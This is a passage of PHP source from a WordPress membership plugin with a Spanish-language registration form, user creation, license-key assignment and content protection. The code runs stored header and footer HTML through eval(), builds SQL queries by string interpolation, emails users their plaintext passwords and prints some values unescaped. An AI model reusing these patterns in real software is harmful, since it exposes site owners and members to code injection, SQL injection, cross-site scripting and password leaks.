							<?php endforeach; ?>
						</ul>
						<?php else: ?>
						<?php echo '&nbsp;'; ?>
						<?php endif; ?>
					</td>
				</tr>
				<?php endforeach; ?>
			</tbody>
		</table>
		<?php
	}

	private function thickbox() {
		wp_enqueue_script('thickbox',null,array('jquery'));
		wp_enqueue_style('thickbox.css', '/'.constant("WPINC").'/js/thickbox/thickbox.css', null, '1.0');
	}

	function register($blank=false) {
		global $wpdb;
		global $membergenius;
		$page = (isset($_REQUEST["page"]) ? $_REQUEST["page"] : "");
		$pluginPage = (function_exists("plugin_basename") ? plugin_basename('miembro-press/miembro-press.php') : "");
		if (!function_exists("current_user_can") || !current_user_can("manage_options") || !is_admin() || strpos($page, $pluginPage) === false) {
			if (!$membergenius->registerLevel && !$membergenius->registerTemp) { return; }
		}
		extract(MemberGenius::extract());
		$validate = MemberGenius::validate();
		if (isset($membergenius->registerMetadata)) {
			extract($membergenius->registerMetadata);
		}
		$get = $_GET;
		$level = key($get);
		array_shift($get);
		$get["existing"] = 0;
		$nonExistingLink = "?".$level."&".http_build_query($get);
		$get["existing"] = 1;
		$existingLink = "?".$level."&".http_build_query($get);
		$get["existing"] = 1;
		$get["passwordSent"] = 1;
		$lostPasswordLink = site_url("?".$level."&".http_build_query($get));
		if (isset($_POST["membergenius_username"])) {
			$username = stripslashes($_POST["membergenius_username"]);
		}
		if (!is_admin()) {
			if ($globalHeader = $membergenius->model->levelSetting(-1, "header")) {
				eval( '?> '.stripslashes($globalHeader).' <?php ' );
			}
			if (isset($membergenius->registerLevel->ID) && ($header = $membergenius->model->levelSetting($membergenius->registerLevel->ID, "header"))) {
				eval( ' ?> '.stripslashes($header).' <?php ' );
			}
		}
		?>
		<?php if (!is_admin()): ?>
		<?php if (isset($_GET["existing"]) && $_GET["existing"] == 1): ?>
		<p align="center"><b style="background-color:yellow;">Cuenta existente: </b> Si ya tiene una cuenta para <i><?php echo get_option("blogname"); ?></i>:<br />
		<b>Rellene el siguiente formulario</b></p>
		<p align="center"><b style="background-color:yellow;">Nueva Cuenta:</b> Si no tienes una cuenta para <i><?php echo get_option("blogname"); ?></i>:<br />
		<b><a style="text-decoration:underline;" href="<?php echo $nonExistingLink; ?>">Haz clic aquí para crear una nueva cuenta</a></b></p>
		<?php else: ?>
		<p align="center"><b style="background-color:yellow;">Cuenta existente: </b> Si ya tiene una cuenta para <i><?php echo get_option("blogname"); ?></i>:<br />
		<b><a href="<?php echo $existingLink; ?>" style="text-decoration:underline;">Haga clic aquí para iniciar sesión &amp; agregue esta compra a su cuenta existente</a></b></p>
		<p align="center"><b style="background-color:yellow;">Nueva cuenta: </b> Si no tiene una cuenta para <i><?php echo get_option("blogname"); ?></i>:<br />
		<b>
		<?php if ((isset($_GET["existing"]) && $_GET["existing"] == 0) || count($_POST) > 0): ?>
		Rellene el siguiente formulario para crear una nueva cuenta
		<?php else: ?>
		<a style="text-decoration:underline;" href="#" onclick="document.getElementById('membergenius_registration').style.display='block'; this.innerHTML = 'Rellene el siguiente formulario para crear una nueva cuenta'; return false;">Haz clic aquí para crear una nueva cuenta</a>
		<?php endif; ?>
		</b></p>
		<?php endif; ?><br />
		<?php endif; ?>
		<form method="post">
			<input type="hidden" name="action" value="miembropress_register">
			<?php if (is_user_logged_in() && current_user_can("manage_options")): ?>
			<input type="hidden" name="wp_http_referer" value="membergenius" />
			<?php endif; ?>
			<?php if (isset($membergenius->registerTemp)): ?><input type="hidden" name="membergenius_temp" value="<?php echo htmlentities($membergenius->registerTemp); ?>">
			<?php elseif (isset($membergenius->registerLevel->level_hash)): ?><input type="hidden" name="membergenius_hash" value="<?php echo htmlentities($membergenius->registerLevel->level_hash); ?>">
			<?php endif; ?>
			<?php if (isset($membergenius->registerLevel->ID)): ?>
			<input type="hidden" name="miembropress_register" value="<?php echo intval($membergenius->registerLevel->ID); ?>">
			<?php endif; ?>
			<?php if (isset($_GET["existing"]) && $_GET["existing"] == 1): ?>
			<h3 style="margin:0;">Acceso a cuenta existente</h3>
			<?php if (isset($_GET["passwordSent"])): ?>
			<blockquote>
				<p>Nueva contraseña enviada. Por favor revise su correo electrónico y continúe llenando esta página.</p>
			</blockquote>
			<?php elseif (isset($validate["userAvailable"]) && $validate["userAvailable"] == true): ?>
			<blockquote>
				<p>El usuario no existe:<br /> <a href="<?php echo $nonExistingLink; ?>">Haz clic aquí para crear una nueva cuenta.</a></p>
			</blockquote>
			<?php elseif (isset($_POST["membergenius_password1"]) && isset($validate["passwordCorrect"]) && $validate["passwordCorrect"] == false): ?>
			<blockquote>
				<p>Contraseña incorrecta:<br /> <a href="<?php echo wp_lostpassword_url($lostPasswordLink); ?>">Haga clic aquí para recuperar su contraseña</a><br />
				Abre en una nueva ventana, asegúrese de volver a esta página.</p>
			</blockquote>
			<?php endif; ?>
			<table cellpadding="0" cellspacing="0">
				<tbody>
					<tr>
						<td style="vertical-align:top; width:200px;"><label for="membergenius_username"><b>Nombre de usuario:</b></label></td>
						<td style="vertical-align:top;"><input type="text" name="membergenius_username" id="membergenius_username" size="15" value="<?php echo htmlentities($username); ?>"></td>
					</tr>
					<tr>
						<td style="vertical-align:top;"><label for="membergenius_password"><b>Contraseña:</b></label></td>
						<td style="vertical-align:top;"><input type="password" name="membergenius_password1" id="membergenius_password" size="10"></td>
					</tr>
					<tr>
						<td style="vertical-align:top;">&nbsp;</td>
						<td style="vertical-align:top;">
							<input type="submit" class="button-primary" value="   Ingresar a la cuenta existente   "> &nbsp;&nbsp;&nbsp;
							<a href="<?php echo wp_lostpassword_url(rawurlencode($lostPasswordLink)); ?>">¿Se te olvidó tu contraseña?</a>
						</td>
					</tr>
				</tbody>
			</table>

			<?php else: ?>
			<?php if (!is_admin()): ?>
			<div id="membergenius_registration">
				<h3 style="margin:0;">Registro de Nueva Cuenta</h3>
				<?php $membergenius->social->registration(); ?>
				<?php endif; ?>

				<table cellpadding="0" cellspacing="0">
					<tbody>
						<tr>
							<td style="vertical-align:top; width:200px;"><label for="membergenius_username"><b>Nombre de Usuario:</b></label></td>
							<td style="vertical-align:top;"><input type="text" name="membergenius_username" id="membergenius_username" size="15" value="<?php echo htmlentities($username); ?>" onblur="membergenius_suggest()" />
								<div class="desc">
									<?php if (!$validate["empty"] && !$validate["username"]): ?>ERROR: El nombre de usuario deseado debe tener al menos 4 caracteres (letras y números).<br />
									<?php elseif (!$validate["empty"] && !$validate["userAvailable"]): ?>ERROR: Nombre de usuario existente, por favor intente con otro.<br />
									<?php else: ?>Ingrese su nombre de usuario deseado. <br /> Debe tener al menos 4 caracteres (letras y números) de largo.<?php endif; ?>
								</div>
							</td>
						</tr>
						<tr>
							<td style="vertical-align:top;"><label for="membergenius_firstname"><b>Nombres:</b></label></td>
							<td style="vertical-align:top;">
							<input type="text" name="membergenius_firstname" id="membergenius_firstname" size="15" value="<?php echo htmlentities($firstname); ?>" />
							<div class="desc"><?php if (!$validate["empty"] && !$validate["firstname"]): ?>ERROR: Su nombre debe tener al menos 2 caracteres (letras y números).<br /><?php endif; ?></div>
							</td>
						</tr>
						<tr>
							<td style="vertical-align:top;"><label for="membergenius_lastname"><b>Apellidos:</b></label></td>
							<td style="vertical-align:top;"><input type="text" name="membergenius_lastname" id="membergenius_lastname" size="15" value="<?php echo htmlentities($lastname); ?>">
							<div class="desc"><?php if (!$validate["empty"] && !$validate["lastname"]): ?>ERROR: Su apellido debe contener al menos 2 caracteres (letras y números).<br /><?php endif; ?></div>
						</tr>
						<tr>
							<td style="vertical-align:top;"><label for="membergenius_email"><b>Email:</b></label></td>
							<td style="vertical-align:top;"><input type="email" name="membergenius_email" id="membergenius_email" size="25" value="<?php echo htmlentities($email); ?>">
							<div class="desc">
								<?php if (!$validate["empty"] && !$validate["email"]): ?>ERROR: Por favor, introduzca una dirección de correo electrónico válida.<br />
								<?php elseif (!$validate["empty"] && !$validate["emailAvailable"]): ?>ERROR: Email existente, por favor intente con otro.
								<?php endif; ?>
							</div>
							</td>
						</tr>
						<tr>
							<td style="vertical-align:top;"><label for="membergenius_password1"><b>Contraseña (dos veces):</b></label></td>
							<td style="vertical-align:top;">
								<?php if (is_admin()): ?>
									<input type="password" name="membergenius_password1" id="membergenius_password1" size="25" placeholder="(Deje en blanco para generar automáticamente)" onkeyup="document.getElementById('membergenius_password2').style.display=((this.value=='')?'none':'block');"/><br />
									<input type="password" name="membergenius_password2" id="membergenius_password2" size="25" placeholder="(Ingrese de nuevo la contraseña)" />
								<?php else: ?>
									<input type="password" name="membergenius_password1" id="membergenius_password1" size="25"/><br />
									<input type="password" name="membergenius_password2" id="membergenius_password2" size="25" />
								<?php endif; ?>
								<div class="desc">
									<?php if (!$validate["empty"] && !$validate["password"]): ?>ERROR: Su contraseña debe tener al menos 6 caracteres (letras y números).<br />
									<?php elseif (!$validate["empty"] && !$validate["passwordMatch"]): ?>ERROR: Las dos contraseñas que ingresaste deben coincidir.<br />
									<?php else: ?>Introduzca su contraseña deseada dos veces. <br /> Debe tener al menos 6 caracteres (letras y números) de longitud.<?php endif; ?>
								</div>
							</td>
						</tr>
						<tr>
							<?php
							$levelTable = $membergenius->model->getLevelTable();
							$hashLevel = $membergenius->registerLevel->level_hash;
							$result = $wpdb->get_var("SELECT `gdpr_active` FROM `$levelTable` WHERE `level_hash` = '$hashLevel'");
							?>
							<?php if ($result){ ?>
								<td style="vertical-align:top;"><label><b></b></label></td>
								<td>
									<?php
									$valoresGDPR = $wpdb->get_results("SELECT `gdpr_url`, `gdpr_text`, `gdpr_color`, `gdpr_size` FROM `$levelTable` WHERE `level_hash` = '$hashLevel'", ARRAY_A);
									foreach ($valoresGDPR as $key => $valores) {
										$gdpr_url = $valores['gdpr_url'];
										$gdpr_text = $valores['gdpr_text'];
										$gdpr_color = $valores['gdpr_color'];
										$gdpr_size = $valores['gdpr_size'];
									}

									?>
									<input type="checkbox" required /> <a href="<?php echo $gdpr_url; ?>" target="_blank" style="color:<?php echo $gdpr_color; ?>; font-size:<?php echo $gdpr_size; ?>; text-decoration: underline;"><?php echo $gdpr_text; ?></a>
								</td>
								<?php
							}
							?>
						</tr>
						<?php if (is_admin()): ?>
						<tr>
							<td style="vertical-align:middle;"><label for="membergenius_email"><b>Membership Level:</b></label></td>
							<td style="vertical-align:middle;">
								<select name="membergenius_level">
									<?php foreach ($membergenius->model->getLevels() as $level): ?>
									<option value="<?php echo intval($level->ID); ?>"><?php echo htmlentities($level->level_name); ?></option>
									<?php endforeach; ?>
								</select>
							</td>
						</tr>
						<?php endif; ?>

						<tr>
							<td style="vertical-align:top;">&nbsp;</td>
							<td style="vertical-align:top;"><input type="submit" class="boton-registrarse" value="   Registrarse   "></td>
						</tr>
					</tbody>
				</table>
				<?php
				if (!is_admin() && !isset($_REQUEST["existing"]) && count($_POST) == 0): ?>
				<script type="text/javascript">
				<!--
				//document.getElementById("membergenius_registration").style.display="none";
				// -->
				</script>
				<?php endif; ?>
				<script type="text/javascript">
					<!--
					<?php if (is_admin()): ?>document.getElementById("membergenius_password2").style.display="none";<?php endif; ?>

					function membergenius_suggest() {
						var username = document.getElementById("membergenius_username");
						var firstname = document.getElementById("membergenius_firstname");
						var lastname = document.getElementById("membergenius_lastname");

						if (!username || username.value == undefined || !firstname || firstname.value == undefined || !lastname || lastname.value == undefined) {
							return;
						}

						var matches = username.value.split(" ");
						if (!matches || !matches.length || matches.length != 2) { return; }
						if (!matches[0].match(/^[A-Z]+$/i) || !matches[1].match(/^[A-Z]+$/i)) { return; }
						if (firstname.value != "" || lastname.value != "") { return; }

						firstname.value = matches[0];
						lastname.value = matches[1];
					}
					// -->
				</script>
			</div>
			<?php endif; ?>
		</form>
		<?php if (!is_admin()) { if ($globalFooter = $membergenius->model->levelSetting(-1, "footer")) { eval( ' ?> '.stripslashes($globalFooter).' <?php ' ); } if (isset($membergenius->registerLevel->ID) && ($footer = $membergenius->model->levelSetting($membergenius->registerLevel->ID, "footer"))) { eval( ' ?> '.stripslashes($footer).' <?php ' ); } } ?>
		<?php
	}

	public function create($vars=null, $api=false) {
		global $membergenius;
		global $wpdb;

		$notify = true;
		$redirect = true;
		if ($api) { $redirect = false; }
		if ($vars==null) {
			if (!$api && !is_admin() && !current_user_can("administrator") && isset($_POST["membergenius_level"])) {
				unset($_POST["membergenius_level"]);
			}
			foreach ($_POST as $key => $value) {
				if (strpos($key, "social_") === 0) {
					unset($_POST[$key]);
				}
			}
			$vars = $_POST;
		}
		if (!isset($vars["action"])) { return; }
		if ($vars["action"] != "miembropress_register") {
			return array("error", new WP_Error("invalid_action", "Not a valid action"));
		}
		extract(MemberGenius::extract($vars));
		$validate = MemberGenius::validate($vars);
		$level = null;
		if (isset($vars["membergenius_level"])) {
			$level = intval($vars["membergenius_level"]);
		} elseif (isset($membergenius->registerTemp) && $membergenius->registerTemp) {
			$temp = $membergenius->model->getTempFromTransaction($membergenius->registerTemp);
			if ($temp && isset($temp->level_id)) {
				$level = intval($temp->level_id);
			}
		} elseif (isset($membergenius->registerLevel) && isset($membergenius->registerLevel->ID)) {
			$level = $membergenius->registerLevel->ID;
		} elseif ($request = $membergenius->hashRequest()) {
			if ($registerLevel = $membergenius->model->getLevelFromHash($request)) {
				$level = $registerLevel->ID;
			}
		}
		$existing = (isset($_GET["existing"]) && $_GET["existing"] == 1);
		if (!$existing && $validate["pass"] == false) {
			if ($validate["passwordCorrect"] == false) {
				return array("error" => new WP_Error("incorrect_password", "You have entered an incorrect password."));
			}
			if ($validate["firstname"] == false) {
				return array("error" => new WP_Error("bad_firstname", "You have entered a bad first name."));
			}
			if ($validate["lastname"] == false) {
				return array("error" => new WP_Error("bad_lastname", "You have entered a bad last name."));
			}
			if ($validate["email"] == false) {
				return array("error" => new WP_Error("bad_email", "You have entered a bad email address."));
			}
			if ($validate["userAvailable"] == false) {
				return array("error" => new WP_Error("user_exists", "That username already exists, please try another."));
			}
			if ($validate["emailAvailable"] == false) {
				return array("error" => new WP_Error("email_exists", "That email address already exists, please try another."));
			}
			return array("error" => new WP_Error("incomplete", "Please fill out the entire registration form."));
		}
		if ($level == null || !is_numeric($level)) {
			return array("error" => new WP_Error("register_level", "Invalid registration level: ".$level));
		}
		$txn = null;
		if (isset($membergenius->registerTemp) && $membergenius->registerTemp) {
			$txn = $membergenius->registerTemp;
		} elseif (isset($vars["membergenius_temp"]) && $vars["membergenius_temp"]) {
			$txn = $vars["membergenius_temp"];
		}
		if ($existing){
			if ($user = get_user_by('login', $username)) {
				$check_password = wp_check_password($password1, $user->data->user_pass, $user->ID);
				if ($check_password){
					$membergenius->model->add($user->ID, $level, $txn);
					$membergenius->model->removeTemp($txn);
					if (!is_admin()) {
						if ($redirect) {
							wp_signon(array('user_login' => $username, 'user_password' => $password1, 'remember' => true), (is_ssl()?true:false));
							$levelInfo = $membergenius->model->getLevel($level);
							$nameLevel = $membergenius->model->getLevelName($level);
							$userID = intval($user->ID);
							$licenciaKey = $wpdb->get_var("SELECT licencias FROM wpop_licencias ORDER BY id LIMIT 1");
							$idLicencia = $wpdb->get_var("SELECT id FROM wpop_licencias ORDER BY id LIMIT 1");
							if ($nameLevel == "Full") {
								$wpdb->query("INSERT INTO wpop_licencias_member (id, licencia, activado, type, user_id) VALUES ($idLicencia, '$licenciaKey', '0', 'Full', $userID)");
								$wpdb->query("DELETE FROM wpop_licencias WHERE licencias = '$licenciaKey'");
							}
							if ($nameLevel == "Personal") {
								$wpdb->query("INSERT INTO wpop_licencias_member (id, licencia, activado, type, user_id, maxsitio) VALUES ($idLicencia, '$licenciaKey', '0', 'Personal', $userID, 3)");
								$wpdb->query("DELETE FROM wpop_licencias WHERE licencias = '$licenciaKey'");
							}
							if ($nameLevel == "Profesional") {
								$wpdb->query("INSERT INTO wpop_licencias_member (id, licencia, activado, type, user_id, maxsitio) VALUES ($idLicencia, '$licenciaKey', '0', 'Profesional', $userID, 9)");
								$wpdb->query("DELETE FROM wpop_licencias WHERE licencias = '$licenciaKey'");
							}
							if ($nameLevel == "Agencia") {
								$wpdb->query("INSERT INTO wpop_licencias_member (id, licencia, activado, type, user_id, maxsitio) VALUES ($idLicencia, '$licenciaKey', '0', 'Agencia', $userID, 30)");
								$wpdb->query("DELETE FROM wpop_licencias WHERE licencias = '$licenciaKey'");
							}
							if (isset($levelInfo->level_page_register) && ($redirect = get_permalink(intval($levelInfo->level_page_register)))) {
								wp_redirect($redirect);
								die();
							} else {
								wp_redirect(home_url());
								die();
							}
							return intval($user->ID);
						}
					}
				}
			}
		}else{
			$newUser = wp_insert_user(array( 'user_login' => $username, 'user_pass' => $password1, 'user_email' => $email, 'first_name' => $firstname, 'last_name' => $lastname, 'role' => 'subscriber' ));
			if (is_wp_error($newUser)) {
				return $newUser;
			}
			update_user_meta($newUser, "first_name", $firstname);
			update_user_meta($newUser, "last_name", $lastname);
			foreach ($vars as $key=>$value) {
				if (strpos($key, "social_") === 0) {
					$membergenius->model->userSetting($newUser, $key, $value);
				}
			}

			//ESTO VA SI O SI
			$membergenius->model->add($newUser, $level, $txn);
			if (isset($temp) && isset($temp->level_status) && $temp->level_status == "C") {
				$membergenius->model->cancel($newUser, $level);
			}
			$userID = intval($newUser);
			$levelInfo = $membergenius->model->getLevel($level);
			$nameLevel = $membergenius->model->getLevelName($level);
			$licenciaKey = $wpdb->get_var("SELECT licencias FROM wpop_licencias ORDER BY id LIMIT 1");
			$idLicencia = $wpdb->get_var("SELECT id FROM wpop_licencias ORDER BY id LIMIT 1");
			if ($nameLevel == "Full") {
				$wpdb->query("INSERT INTO wpop_licencias_member (id, licencia, activado, type, user_id) VALUES ($idLicencia, '$licenciaKey', '0', 'Full', $userID)");
				$wpdb->query("DELETE FROM wpop_licencias WHERE licencias = '$licenciaKey'");
			}
			if ($nameLevel == "Personal") {
				$wpdb->query("INSERT INTO wpop_licencias_member (id, licencia, activado, type, user_id, maxsitio) VALUES ($idLicencia, '$licenciaKey', '0', 'Personal', $userID, 3)");
				$wpdb->query("DELETE FROM wpop_licencias WHERE licencias = '$licenciaKey'");
			}
			if ($nameLevel == "Profesional") {
				$wpdb->query("INSERT INTO wpop_licencias_member (id, licencia, activado, type, user_id, maxsitio) VALUES ($idLicencia, '$licenciaKey', '0', 'Profesional', $userID, 9)");
				$wpdb->query("DELETE FROM wpop_licencias WHERE licencias = '$licenciaKey'");
			}
			if ($nameLevel == "Agencia") {
				$wpdb->query("INSERT INTO wpop_licencias_member (id, licencia, activado, type, user_id, maxsitio) VALUES ($idLicencia, '$licenciaKey', '0', 'Agencia', $userID, 30)");
				$wpdb->query("DELETE FROM wpop_licencias WHERE licencias = '$licenciaKey'");
			}
			$membergenius->model->removeTemp($txn);
			$headers = 'From: '.get_option("blogname").' < '.get_option("admin_email") .' > ' . "";
			$home = home_url("/login");
			$message = "Un nuevo miembro se ha registrado con la siguiente información: \nSitio Web: ".$home."\nNombre de Usuario: ".$username."\nEmail: ".$email."\nNombre: ".$firstname."\nApellido: ".$lastname." ";
			$message .= "\n Dirección IP: ".$_SERVER["REMOTE_ADDR"]." ";
			$message .= "";
			$levels = $membergenius->model->getLevels();
			if ($levels && is_array($levels) && count($levels) > 0 && isset($levels[$level])) {
				$theLevel = $levels[$level];
				$message .= "\nLevel: ".$theLevel->level_name." ";
				$message .= "\nTotal Members on Level: ".intval($theLevel->active)." ";
			}
			$message .= "\nPowered by MiembroPress: http://www.miembropress.com";
			wp_mail(get_option("admin_email"), $this->subject("Un nuevo miembro se ha registrado"), $message, $headers);
			$message = "";
			if (is_admin()) {
				$message = "Te hemos registrado con la siguiente información: ";
			} else {
				$message = "Te has registrado con la siguiente información:";
			}
			$message .= " \nSitio Web: ".$home." \nNombre de Usuario: ".$username." ";
			if (is_admin()) {
				$message .= "\nContraseña: " . $password1 . "";
			}else{
				$message .= "\nContraseña: " . $password1 . "";
			}
			$message .= " \nEmail: ".$email." \nNombre: ".$firstname." \nApellido: ".$lastname." ";
			if ($attribution = $membergenius->model->setting("emailattribution")) {
				$link = "http://www.miembropress.com";
				if ($affiliate = $membergenius->model->setting("affiliate")) {
					$link = $affiliate;
				}
				$message .= "\nPowered by MiembroPress: $link";
			}
			if ($notify) {
				wp_mail($email, $this->subject("Su Información de Registro"), $message, $headers);
			}

			if (is_admin()) {
				return $userID;
			} elseif ($redirect) {
				if (current_user_can("manage_options")) {
					$this->maybeRedirect();
				} else {
					wp_signon(array('user_login' => $username, 'user_password' => $password1, 'remember' => true), (is_ssl()?true:false));
					if (isset($levelInfo->level_page_register) && ($redirect = get_permalink(intval($levelInfo->level_page_register)))) {
						wp_redirect($redirect);
						die();
					} else {
						wp_redirect(home_url());
						die();
					}
				}
				return intval($newUser);
			}
			if (is_wp_error($newUser)) {
				return $newUser;
			}
		}
		return 0;
	}

	public function subject($text) {
		$blogname = get_option("blogname");
		if ($blogname) {
			$prefix = $blogname;
		} else {
			$parse = parse_url(home_url());
			if (isset($parse["host"])) {
				$prefix = trailingslashit($parse["host"]).trim($parse["path"], "/");
			}
		}
		if ($prefix != "") {
				return $prefix . ": " . $text;
		}
		return $text;
	}

	public static function textbox($name, $value="") {
		if (get_option($name)) {
			$value = get_option($name);
		} ?>
		<input type="text" name="<?php echo $name ?>" size="15" value="<?php echo $value ?>" />
		<?php
	}

	public static function textarea($name, $value="") {
		if (get_option($name)) {
			$value = get_option($name);
		} ?>
		<textarea name="<?php echo $name ?>" cols="80" rows="8"><?php echo $value ?></textarea>
		<?php
	}
}

class MemberGeniusProtection {
	public $allowed;
	public $protectedTitle;
	public $protectedLevel;
	public function __construct() {
		$this->protectedTitle = "Registration Area";
		add_action('plugins_loaded', array(&$this, 'init'), 10, 2);
		add_action('wp_login', array(&$this, 'afterLogin'), 1000, 2);
		add_filter('getarchives_where', array(&$this, 'where'), 10, 2);
		add_filter('getarchives_join', array(&$this, 'join'), 10, 2);
		add_filter('posts_groupby', array(&$this, 'groupBy'), 10, 2);
		add_filter('posts_where', array(&$this, 'where'), 10, 2);
		add_filter('posts_join', array(&$this, 'join'), 10, 2);
		add_action('wp_list_pages_excludes', array(&$this, 'excludePageFrontend'));
		add_action('pre_get_posts', array(&$this, 'excludePageBackend'), 10, 1);
		add_filter('get_pages', array(&$this, 'excludePageList'), 1, 2);
		add_filter('the_posts', array(&$this, 'comments'));
		add_filter('wp', array(&$this, 'loggedOut'));
		add_filter('pre_get_posts', array(&$this, 'loggedOutQuery'), 2, 1);
		add_filter('wp', array(&$this, 'loggedIn'));
		add_filter('wp', array(&$this, 'logMeOut'));
	}

	public function pageRedirect() {
		global $membergenius;
		$current_user = wp_get_current_user();
		if (!isset($current_user->ID)) { return; }
		if ($membergenius->hashRequest()) { return; }
		if (is_404()) {
			foreach ($membergenius->model->getLevelInfo($current_user->ID) as $level) {
				if (isset($level->level_page_login) && $level->level_page_login) {
					if ($redirect = get_permalink(intval($level->level_page_login))) {
						wp_redirect($redirect);
						die();
					}
				}
			}
		}
	}

	public function loggedOutQuery($query) {
		global $membergenius;
		global $post;
		if (is_user_logged_in()) { return; }
		if ($membergenius->hashRequest()) { return $query; }
		$nonmember_page = @intval($membergenius->model->setting("nonmember_page"));
		$nonmember_url = trim($membergenius->model->setting("nonmember_url"));
		if ($nonmember_url == "http://" || $nonmember_url == "https://") { $nonmember_url = ""; }
		if ($nonmember_page == 0) {
			if ($nonmember_url) {
				wp_redirect($nonmember_url);
				die();
			}
			return;
		}
		if (isset($query->queried_object)) { return; }
		if ($query->is_home() && $query->is_main_query()) {
			$this->pageTakeover($query, $nonmember_page);
		} elseif (!isset($query->queried_object) && $query->is_page()) {
			$this->pageTakeover($query, $nonmember_page);
		}
	}

	private function pageTakeover(&$query, $id) {
		$id = @intval($id);
		$query->set('post_type' ,'page');
		$query->set('post__in' ,array($id));
		$query->set('p' , $id);
		$query->set('page_id' , $id);
	}

	public function loggedIn() {
		global $wp_query;
		global $membergenius;
		$permalinks = get_option("permalink_structure");
		if ($wp_query->get("name") != "login" && !isset($_GET["login"])) { return; }
		if ($membergenius->hashRequest()) { return; }
		if (is_user_logged_in()) {
			wp_redirect(home_url());
			die();
		}
		wp_redirect(wp_login_url(home_url()));
		die();
	}

	public function logMeOut() {
		global $wp_query;
		global $membergenius;
		if ($wp_query->get("name") != "logout") { return; }
		wp_logout();
		die();
	}

	public function loggedOut() {
		global $membergenius;
		global $posts;
		if (is_user_logged_in()) { return; }
		if ($membergenius->hashRequest()) { return; }
		$nonmember_page = @intval($membergenius->model->setting("nonmember_page"));
		$nonmember_url = $membergenius->model->setting("nonmember_url");
		if (!is_array($posts) || count($posts) == 0) {
			if ($nonmember_page == 0) {
				wp_redirect(wp_login_url($_SERVER['REQUEST_URI']));
				die();
			}
		}
	}


	public function afterLogin($user_login, $user=null) {
		global $membergenius;
		if ($membergenius->hashRequest()) { return; }
		if (is_admin() && current_user_can("administrator")) { return; }
		if ($user == null && $user_login) { $user = get_user_by("login", $user_login); }
		foreach ($membergenius->model->getLevelInfo($user->ID) as $level) {
			if (isset($level->level_page_login) && $level->level_page_login) {
				if ($redirect = get_permalink(intval($level->level_page_login))) {
					wp_redirect($redirect);
					die();
				}
			}
		}
	}

	public function init() {
		global $membergenius;
		$current_user = wp_get_current_user();
		if (!is_admin()) {
			if (is_user_logged_in()) {
				$this->allowed = $membergenius->model->getPosts($current_user->ID);
				$ip = ip2long($_SERVER["REMOTE_ADDR"]);
				$loginFirst = intval($membergenius->model->userSetting($current_user->ID, "loginFirst"));
				if (!$loginFirst) {
					$membergenius->model->userSetting($current_user->ID, "loginFirst", $ip);
				}
				$membergenius->model->userSetting($current_user->ID, "loginLastTime", time());
				$logins = $membergenius->model->userSetting($current_user->ID, "logins");
				if (!is_array($logins)) {
					$logins = array();
				}
				$logins[$ip] = time();
				arsort($logins);
				$logins = array_slice($logins, 0, 10, true);
				$membergenius->model->userSetting($current_user->ID, "logins", $logins);
			} else {
				$this->allowed = $membergenius->model->getPostAccess(-1);
			}
		} else {
			$this->allowed = null;
		}
	}

	public function where($query="") {
		if (is_admin()) { return $query; }
		if (!is_array($this->allowed)) { return $query; }
		if ($query != "") { $query .= " AND "; }
		if (count($this->allowed) > 0) {
			$sql = "ID IN(".implode($this->allowed, ",").")";
		} else {
			$sql = "NOT 1";
		}
		$query .= $sql;
		return $query;
	}

	public function excludePageList($pages, $r) {
		if (!is_admin()) { return $pages; }
		for ($i = 0; $i < sizeof($pages); $i++) {
			if ($pages[$i]->post_name == "membergenius") {
				unset($pages[$i]);
				break;
			}
		}
		return $pages;
	}

	public function excludePageBackend($query) {
		if (!is_admin()) { return $query; }
		if ($placeholder = get_page_by_path("membergenius")) {
			$query->set( 'post__not_in', array( $placeholder->ID ) );
		}
		return $query;
	}

	public function excludePageFrontend($pages) {
		global $wpdb;
		if (!$this->allowed || !is_array($this->allowed)) {
			return $pages;
		}
		$allPages = get_all_page_ids();
		$excludePages = array_diff($allPages, $this->allowed);
		if ($placeholder = get_page_by_path("membergenius")) {
			$excludePages[] = intval($placeholder->ID);
		}
		return array_merge($pages, $excludePages);
	}

	public function join($join="", $force=false) {
		global $wp_query, $wpdb, $wp_version;
		global $post;
		if (is_admin()) { return $join; }
		if (!$this->allowed || !is_array($this->allowed)) { return $join; }
		if (strpos($join, $wpdb->term_relationships) !== false) { return $join; }
		$join .= " LEFT JOIN ".$wpdb->term_relationships." AS crel ON (".$wpdb->posts.".ID = crel.object_id) LEFT JOIN ".$wpdb->term_taxonomy." AS ctax ON (ctax.taxonomy = 'category' AND crel.term_taxonomy_id = ctax.term_taxonomy_id) LEFT JOIN ".$wpdb->terms." AS cter ON (ctax.term_id = cter.term_id) ";
		return $join;
	}

	function groupBy( $groupby ) {
		if (is_admin()) { return $groupby; }
		if (!$this->allowed || !is_array($this->allowed)) { return $groupby; }
		global $wpdb;
		$mygroupby = $wpdb->posts.".ID";
		if( preg_match( "/".$mygroupby."/", $groupby )) { return $groupby; }
		if( !strlen(trim($groupby))) { return $mygroupby; }
		return $groupby . ", " . $mygroupby;
	}

	function getTerms($categories, $arg) {
		global $post;
		if (is_admin()) { return $categories; }
		if (!$this->allowed || !is_array($this->allowed)) { return $categories; }
		if (reset($arg) == "link_category") { return $categories; }
		if (isset($post) && isset($post->post_name) && $post->post_name == "wishlist-member") { return array(); }
		foreach ($categories as $index => $obj) {
			if (isset($obj->term_id)) {
				$id = $obj->term_id;
				$posts = get_posts(array("numberposts" => 1, "category" => $id, "suppress_filters" => false));
				if (count($posts) == 0) {
					unset($categories[$index]);
				}
			}
		}
		return $categories;
	}

	public function lockdown($action="login", $hash=null) {
		global $membergenius;
		add_filter( 'wp_nav_menu_items', '__return_empty_string', 10, 2 );
		remove_all_filters('posts_groupby');
		remove_all_filters('posts_where');
		remove_all_filters('posts_join');
		if ($action == "login") {
			add_filter('the_content', array(&$this, 'content'), 1000);
		} elseif ($action == "register") {
			add_filter('page_template', array(&$this, "lockdown_template"), 10);
			add_filter('the_content', array($membergenius->admin, 'register'), 1000);
			add_filter('the_permalink', array(&$this, "permalink"), 1000);
		}
		add_action('wp_footer', array(&$this, 'noFooter'), 1000);
		add_filter('pre_get_posts', array(&$this, 'noPosts'), 1000);
		add_action('wp', array(&$this, 'noPost'), 10);
		add_filter('the_posts', array(&$this, 'hideComments'));
		add_filter('the_title', array(&$this, 'title'));
		add_filter('get_comments_number', '__return_zero');
		add_filter('comments_array', '__return_empty_array', 1);
		add_filter('sidebars_widgets', array(&$this, 'clear_widgets'));
		add_filter('the_date', '__return_null');
		add_filter('get_the_date', '__return_null');
		add_filter('the_time', '__return_null');
		add_filter('get_the_time', '__return_null');
		add_filter('get_the_categories', '__return_empty_string');
		add_filter('wp_list_categories', '__return_empty_string');
		add_filter('get_pages', '__return_null');
	}

	function lockdown_template($template) {
